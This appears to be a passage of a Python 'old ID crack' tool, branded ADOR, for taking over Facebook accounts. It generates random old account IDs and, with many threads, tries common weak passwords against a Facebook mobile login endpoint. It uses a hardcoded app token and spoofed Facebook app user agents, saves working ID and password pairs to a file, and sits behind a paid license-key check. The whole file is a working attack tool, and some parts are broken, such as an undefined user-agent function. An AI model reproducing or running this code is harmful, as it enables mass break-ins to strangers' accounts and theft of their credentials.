appx_curl.setopt(pycurl.WRITEDATA, appx_buffer)
appx_curl.perform()
appx_data = appx_buffer.getvalue().decode("utf-8").splitlines()
raw = "".join(appx_data)

#----------------------------[USER/AGENT]-----------------------------------#
def ua():
    rr = random.randint
    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
    rx = random.randrange(1, 999)
    xx = (f'''Mozilla/5.0 (Windows NT 10.0; {str(rr(9, 11))}; Win64; x64){aZ}{rx}{aZ}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36''')
    return xx

def Samsung():
    Anderson = random.choice([
        '10', '13', '7.0.0', '7.1.1', '9', '12', '11', '9.0', '8.0.0', 
        '7.1.2', '7.0', '4', '5', '4.4.2', '5.1.1', '6.0.1', '9.0.1'])
    model = random.choice([
        'GT-I9505', 'SM-T835', 'SM-S901U', 'MMB29K', 'SM-S134DL', 'SM-J250F', 
        'SM-A217F', 'SM-A326B', 'SM-A125F', 'SM-A720F', 'SM-A326U', 'SM-G532M', 
        'SM-J410G', 'SM-A205GN', 'SM-A505GN', 'SM-G930F', 'SM-J210F', 'SM-N9005'])
    vir = str(random.choice(range(111111111, 999999999)))
    cho = str(random.choice(range(43, 447)))
    fb = random.choice([
        'com.facebook.adsmanager|MobileAdsManagerAndroid', 
        'com.facebook.katana|FB4A', 'com.facebook.orca|Orca-Android', 
        'com.facebook.mlite|MessengerLite'])
    FBAN = fb.split('|')[1]
    platform = fb.split('|')[0]
    ua = (f'Dalvik/2.1.0 (Linux; U; Android {Anderson}; {model} Build/LRX22C) '
          f'[FBAN/{FBAN};FBAV/{cho}.0.0.15.89;FBPN/{platform};FBLC/sv_SE;FBBV/{vir};'
          f'FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/{model};FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;'
          f'FBDM{{density={str(random.choice(range(1, 4)))}.0,width={str(random.choice(range(720, 1500)))}'
          f',height={str(random.choice(range(1500, 2000)))};FB_FW/1;]')
    return ua

def userag1():
    fb_v1 = str(random.choice(range(111, 555)))
    fb_v2 = str(random.choice(range(111, 555)))
    rdp1 = str(random.choice(range(111111111, 333333333)))
    rdp2 = str(random.choice(range(111111111, 333333333)))
    andv = str(random.choice(range(8, 12)))
    ua = (f'Dalvik/2.1.0 (Linux; U; Android {andv}.0.0; moto e5 plus Build/OPPS27.91-179-8-16) '
          f'[FBAN/FB4A;FBAV/{fb_v1}.0.0.50.{fb_v2};FBPN/com.facebook.katana;FBLC/es_MX;FBBV/{rdp1};'
          f'FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/{andv}.0.0;FBCA/armeabi-v7a:armeabi;'
          f'FBDM{{density=1.7,width=720,height=1358}};FB_FW/1;FBRV/0;]')
    return ua

def userag2():
    fb_v1 = str(random.choice(range(111, 555)))
    fb_v2 = str(random.choice(range(111, 555)))
    rdp1 = str(random.choice(range(111111111, 433333333)))
    rdp2 = str(random.choice(range(111111111, 433333333)))
    andv = str(random.choice(range(8, 12)))
    ua = (f'Dalvik/2.1.0 (Linux; U; Android {andv}.1.1; vivo V3Max Build/LMY47V) '
          f'[FBAN/Orca-Android;FBAV/{fb_v1}.0.0.16.{fb_v2};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{rdp1};'
          f'FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/{andv}.1.1;FBCA/armeabi-v7a:armeabi;'
          f'FBDM{{density=3.0,width=1080,height=1920}}')
    return
   
#----------------------------[LOGO]-----------------------------------#
logo = f"""{g}
  A)aa   D)dddd    O)oooo  R)rrrrr 
 A)  aa  D)   dd  O)    oo R)    rr
A)    aa D)    dd O)    oo R)  rrr 
A)aaaaaa D)    dd O)    oo R) rr   
A)    aa D)    dd O)    oo R)   rr 
A)    aa D)ddddd   O)oooo  R)    rr {w}v1{g}.{w}0
{p}═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═{w}
TOOL OWNER    {r}:{w} ALEX ADOR
TOOL TYPE     {r}:{w} OLD ID CRACK
TOOL STATUS   {r}:{w} \x1b[0;45mPREMIUM\x1b[0;91m{w}
YOUR KEY      {r}:{g} {keys}
{p}═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═"""
#----------------------------[MAIN/DEF]-----------------------------------#
def main():
    user = []
    os.system("clear")
    print(logo)
    print(f'{g}<{r}/{g}>{w} EXAMPLE   {r}: {w}10000 {g}| {w}20000 {g}| {w}90000')
    lin()
    limit = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
    lin()
    os.system('clear')
    print(logo)
    print(f"{g}[{r}1{g}] {w}SERVER {r}~ {g}[{w}2011{r}-{w}2014{g}]")
    print(f"{g}[{r}2{g}] {w}SERVER {r}~ {g}[{w}2009{r}-{w}2010{g}]")
    lin()
    ask = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
    lin()
    if ask in ["1"]:
        sv = f"{g}[{w}2011{r}-{w}2014{g}]"
        star = "10000"
        for i in range(int(limit)):
            data = str(random.choice(range(1000000000, 9999999999)))
            user.append(data)
    else:
        sv = f"{g}[{w}2008{r}-{w}2010{g}]"
        star = "100000"
        for i in range(int(limit)):
            data = str(random.choice(range(100000000, 999999999)))
            user.append(data)
    
    with ThreadPool(max_workers=30) as ADOR:
        tl = str(limit)
        os.system('clear')
        print(logo)
        print(f'{g}[{r}~{g}] {w}TOTAL ID {r}: {p}{limit} {g}[{r}~{g}] {w}SERVER {r}: {sv}')
        print(f'{g}[{r}~{g}] {w}IF NO RESULT {g}[{w}ON{r}/{w}OFF{g}]{w} AIRPLANE MODE{g}')
        lin()
        for mal in user:
            uid = star + mal
            ADOR.submit(login, uid, tl)
    print("")
    lin()
    print(f"{g}[{r}~{g}] {w}CRACK PROCESSED COMPLETED")
    print(f"{g}[{r}~{g}] {w}TOTAL OK ID : {g}{str(len(oks))}")
    lin()
    input(f"{g}[{r}~{g}] {w}PRESS ENTER TO EXIT")
    sys.exit()

def login(uid, tl):
    global oks, loop
    try:
        sys.stdout.write(f"\r➤ {g}ADOR{r}-{g}XD {r}[{g}{loop}{r}/{w}{tl}{r}] [{g}OK{r}/{g}{len(oks)}{r}]")
        sys.stdout.flush()
        for pw in ["123456", "1234567", "12345678", "123456789", "123123", "000000"]:
            headers = {
                'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'user-agent': ug2(),
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger'
            }
            url = ('https://b-api.facebook.com/method/auth.login?format=json&email=' +
                   str(uid) + '&password=' + str(pw) + 
                   '&credentials_type=device_based_login_password&generate_session_cookies=1' +
                   '&error_detail_type=button_with_disabled&source=device_based_login' +
                   '&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US' +
                   '&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.' +
                   'HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32' +
                   '&fb_api_req_friendly_name=authenticate&cpl=true')
            rp = requests.get(url, headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r{g}SUCCESS {p}➤ {w}{uid} {r}|{w} {pw}")
                open("/sdcard/ADOR-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break 
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r{g}SUCCESS {p}➤ {g}{uid} {r}|{g} {pw}")
                open("/sdcard/ADOR-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
            else:
                continue
        loop += 1
    except Exception as e:
        pass

#----------------------------[APPROVAL]-----------------------------------#
def approval():
    global keys, raw
    if keys in raw:
        os.system("clear")
        print(logo)
        print(f"{g}[{r}~{g}] {w}YOUR KEY IS APPROVED")
        lin()
        time.sleep(1)
        main()
    else:
        os.system("clear")
        print(logo)
        print(f"{g}[{r}~{g}] {w}YOUR KEY IS NOT APPROVED")
        print(f"{g}[{r}~{g}] {w}PLEASE CONTACT TOOL OWNER FOR ACTIVATION{g}")
        lin()
        input(f"{g}[{r}~{g}] {w}PRESS ENTER TO SEND KEY TOOL OWNER")
        os.system("xdg-open https://www.facebook.com/profile.php?id=100041989417595")
        sys.exit()
approval()
#----------------------------[CODE/END]-----------------------------------#
